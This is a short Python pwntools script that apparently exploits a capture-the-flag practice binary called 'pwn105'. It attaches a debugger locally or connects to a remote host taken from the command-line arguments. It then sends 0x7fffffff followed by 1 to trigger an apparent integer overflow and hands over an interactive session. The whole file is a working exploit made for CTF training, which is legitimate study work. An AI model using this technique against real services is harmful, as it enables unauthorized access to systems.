from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl
import sys

context.binary = exe = ELF("./pwn105.pwn105", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "warning"

class Exploit:
    def __init__(self, p: process):
        self.p = p
    
    def debug(self, script):
        if not args.RMT:
            attach(self.p, script)
        
    def send(self, content):
        p = self.p
        p.sendlineafter(b"]>>", content)

if args.RMT:
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process()

x = Exploit(p)

x.debug("break *main+181\nc")
x.send(str(0x7fffffff).encode())
x.send(str(0x1).encode())
p.interactive()